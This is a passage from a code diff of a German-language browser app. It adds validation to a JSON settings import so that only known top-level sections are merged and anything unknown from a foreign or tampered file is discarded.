           `<button class="pill ${regHat(k)?'on':''}" onclick="regHatSet('${k}',${!regHat(k)})">${l}</button>`).join('')}
       </div>
       <div class="note">Was du abwählst, verschwindet aus dem Plan.</div>
@@ -4756,8 +5333,14 @@ window.impo=inp=>{
   const f=inp.files[0]; if(!f) return;
   const r=new FileReader();
   r.onload=()=>{ try{ const d=JSON.parse(r.result);
-      if(!d.profile) throw 0;
-      S=deepMerge(structuredClone(DEF),d); save(); render(); toast('Import erfolgreich'); }
+      if(!d || typeof d!=='object' || Array.isArray(d)) throw 0;
+      if(!d.profile || typeof d.profile!=='object') throw 0;
+      /* Nur bekannte Bereiche übernehmen. Alles Unbekannte aus einer fremden
+         oder manipulierten Datei bleibt draußen. */
+      const rein={};
+      Object.keys(DEF).forEach(k=>{ if(k in d) rein[k]=d[k]; });
+      S=deepMerge(structuredClone(DEF),rein); save(); render();
+      toast('Import erfolgreich'); }
     catch(e){ toast('Datei nicht lesbar'); } };
   r.readAsText(f); inp.value='';
 };
